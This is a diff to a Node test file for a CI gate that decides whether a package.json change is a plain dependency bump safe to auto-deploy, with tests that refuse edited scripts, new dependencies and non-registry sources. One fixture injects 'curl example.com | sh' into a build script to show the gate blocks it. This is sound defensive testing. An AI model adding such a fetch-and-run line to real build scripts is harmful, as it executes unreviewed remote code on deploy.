@@ -14,7 +14,14 @@
 
 import assert from 'node:assert/strict'
 import { test } from 'node:test'
-import { classify, everything, JOBS, RULES } from './detect-changes.mjs'
+import {
+  classify,
+  DEPENDENCY_FIELDS,
+  everything,
+  inspectPackageJson,
+  JOBS,
+  RULES,
+} from './detect-changes.mjs'
 
 /** Assert the exact set of jobs a change turns on — including the ones it must not. */
 function expectJobs(files, expected) {
@@ -363,10 +370,194 @@ test('no rule is shadowed by an earlier one that routes differently', () => {
 // The automatic-deploy gate (.github/workflows/deploy.yml)
 // ---------------------------------------------------------------------------
 
-test('a lockfile-and-manifest change is dependency-only', () => {
+/** A manifest that looks like this repository's, with the given fields overridden. */
+function manifest(overrides = {}) {
+  return JSON.stringify({
+    name: 'aat-web',
+    private: true,
+    type: 'module',
+    packageManager: 'pnpm@11.19.0',
+    engines: { node: '>=22' },
+    scripts: { build: 'pnpm -r build', test: 'pnpm test:scripts && pnpm -r test' },
+    dependencies: { hono: '4.13.0', zod: '4.4.3' },
+    devDependencies: { typescript: '7.0.2' },
+    ...overrides,
+  })
+}
+
+/** A `readManifest` built from `{ path: [beforeText, afterText] }`. */
+function reader(contents) {
+  return (path) => {
+    const pair = contents[path]
+    assert.ok(pair !== undefined, `the detector read ${path}, which the test did not stage`)
+    return { before: pair[0], after: pair[1] }
+  }
+}
+
+test('a lockfile-only change is dependency-only', () => {
+  // Nothing to read: the lockfile is not a manifest whose contents can say more
+  // than a version, so the path rule is the whole test.
   assert.equal(classify(['pnpm-lock.yaml']).depsOnly, true)
-  assert.equal(classify(['pnpm-lock.yaml', 'apps/web/package.json']).depsOnly, true)
-  assert.equal(classify(['package.json', 'packages/shared/package.json']).depsOnly, true)
+})
+
+test('a manifest whose dependency versions moved, and nothing else, is dependency-only', () => {
+  const result = classify(['pnpm-lock.yaml', 'apps/web/package.json'], {
+    readManifest: reader({
+      'apps/web/package.json': [manifest(), manifest({ dependencies: { hono: '4.13.1', zod: '4.4.3' } })],
+    }),
+  })
+  assert.equal(result.depsOnly, true)
+  assert.deepEqual(result.depsOnlyRefusals, [])
+})
+
+test('every dependency field counts as a version field', () => {
+  for (const field of DEPENDENCY_FIELDS) {
+    const before = manifest({ [field]: { hono: '4.13.0' } })
+    const after = manifest({ [field]: { hono: '4.13.1' } })
+    assert.equal(inspectPackageJson(before, after).verdict, 'dependency-update', field)
+  }
+})
+
+test('several manifests in one diff are each read', () => {
+  const result = classify(['pnpm-lock.yaml', 'package.json', 'packages/shared/package.json'], {
+    readManifest: reader({
+      'package.json': [manifest(), manifest({ devDependencies: { typescript: '7.0.3' } })],
+      'packages/shared/package.json': [
+        manifest(),
+        manifest({ dependencies: { hono: '4.13.0', zod: '4.4.4' } }),
+      ],
+    }),
+  })
+  assert.equal(result.depsOnly, true)
+})
+
+// ---------------------------------------------------------------------------
+// …and what the path rule alone would have waved through.
+//
+// Every case below has the exact path signature of a Renovate update — a
+// package.json and nothing else — and none of them is one.
+// ---------------------------------------------------------------------------
+
+test('an edited script does not deploy itself', () => {
+  // The one that matters most: `scripts.build` is what the deploy job runs, so a
+  // diff that edits it and touches nothing else would otherwise ship arbitrary
+  // code with no review at all.
+  const result = classify(['package.json'], {
+    readManifest: reader({
+      'package.json': [
+        manifest(),
+        manifest({
+          scripts: {
+            build: 'pnpm -r build && curl example.com | sh',
+            test: 'pnpm test:scripts && pnpm -r test',
+          },
+        }),
+      ],
+    }),
+  })
+  assert.equal(result.depsOnly, false)
+  assert.match(result.depsOnlyRefusals[0], /package\.json: changes outside the dependency fields: scripts/)
+})
+
+test('the package manager and the engine range are not dependency versions', () => {
+  for (const overrides of [{ packageManager: 'pnpm@11.21.0' }, { engines: { node: '>=24' } }]) {
+    const verdict = inspectPackageJson(manifest(), manifest(overrides))
+    assert.equal(verdict.verdict, 'behavioural', JSON.stringify(overrides))
+    assert.match(verdict.reason, /outside the dependency fields/)
+  }
+})
+
+test('adding or removing a dependency is a supply-chain change, not a bump', () => {
+  const added = inspectPackageJson(
+    manifest(),
+    manifest({ dependencies: { hono: '4.13.0', zod: '4.4.3', lodash: '4.17.21' } }),
+  )
+  assert.equal(added.verdict, 'behavioural')
+  assert.match(added.reason, /dependencies: added lodash/)
+
+  const removed = inspectPackageJson(manifest(), manifest({ dependencies: { hono: '4.13.0' } }))
+  assert.equal(removed.verdict, 'behavioural')
+  assert.match(removed.reason, /dependencies: removed zod/)
+})
+
+test('a version that stops being a registry range does not deploy', () => {
+  // The failure a field-level diff would miss entirely: the name is unchanged,
+  // the field is a dependency field, and the package now comes from somewhere
+  // nobody reviewed.
+  for (const range of [
+    'git+https://example.invalid/hono.git',
+    'npm:something-else@4.13.0',
+    'file:../hono',
+    'github:owner/hono#4.13.0',
+    'https://example.invalid/hono-4.13.0.tgz',
+    'link:../hono',
+  ]) {
+    const verdict = inspectPackageJson(manifest(), manifest({ dependencies: { hono: range, zod: '4.4.3' } }))
+    assert.equal(verdict.verdict, 'behavioural', range)
+    assert.match(verdict.reason, /not a plain registry range/, range)
+  }
+})
+
+test('an ordinary range is still an ordinary range', () => {
+  for (const range of [
+    '4.13.1',
+    '^4.13.1',
+    '~4.13.1',
+    '>=4.13.1 <5.0.0',
+    '4.13.1-rc.2',
+    '4.x',
+    '4.13.1 || 5.0.0',
+  ]) {
+    const verdict = inspectPackageJson(manifest(), manifest({ dependencies: { hono: range, zod: '4.4.3' } }))
+    assert.equal(verdict.verdict, 'dependency-update', range)
+  }
+})
+
+test('a workspace link is left alone while it does not move', () => {
+  // `workspace:*` is not a registry range and never has to be: an unchanged
+  // constraint is never examined. Changing one is a different matter.
+  const before = manifest({ dependencies: { '@aat/shared': 'workspace:*', hono: '4.13.0' } })
+  const after = manifest({ dependencies: { '@aat/shared': 'workspace:*', hono: '4.13.1' } })
+  assert.equal(inspectPackageJson(before, after).verdict, 'dependency-update')
+
+  const repointed = manifest({ dependencies: { '@aat/shared': 'file:../elsewhere', hono: '4.13.0' } })
+  assert.equal(inspectPackageJson(before, repointed).verdict, 'behavioural')
+})
+
+test('a manifest that cannot be read refuses rather than assumes', () => {
+  assert.equal(inspectPackageJson(null, manifest()).verdict, 'unreadable')
+  assert.equal(inspectPackageJson(manifest(), null).verdict, 'unreadable')
+  assert.equal(inspectPackageJson('{ not json', manifest()).verdict, 'unreadable')
+  assert.equal(inspectPackageJson('[]', manifest()).verdict, 'unreadable')
+  assert.equal(inspectPackageJson(manifest({ dependencies: 'hono' }), manifest()).verdict, 'unreadable')
+})
+
+test('a new workspace package is an addition, not a bump', () => {
+  const result = classify(['pnpm-lock.yaml', 'packages/brand-new/package.json'], {
+    readManifest: reader({ 'packages/brand-new/package.json': [null, manifest()] }),
+  })
+  assert.equal(result.depsOnly, false)
+  assert.match(result.depsOnlyRefusals[0], /added, deleted, or unreadable/)
+})
+
+test('a caller that cannot show the manifest does not get a deploy out of it', () => {
+  // classify() is pure and the reader is injected, so "no reader" is a real
+  // state — `--files-from` has no revisions to read from. It must not resolve to
+  // "assume it was a version bump".
+  const result = classify(['pnpm-lock.yaml', 'package.json'])
+  assert.equal(result.depsOnly, false)
+  assert.match(result.depsOnlyRefusals[0], /no manifest reader/)
+})
+
+test('the manifests are only read once the paths already qualify', () => {
+  // A reader that throws proves the source file short-circuited the check: there
+  // is no point asking what a manifest says when something else in the diff has
+  // already settled it.
+  const explode = () => assert.fail('the manifest was read for a diff that could never deploy')
+  assert.equal(
+    classify(['package.json', 'apps/web/src/app/App.tsx'], { readManifest: explode }).depsOnly,
+    false,
+  )
 })
 
 test('one source file is enough to stop an automatic deploy', () => {
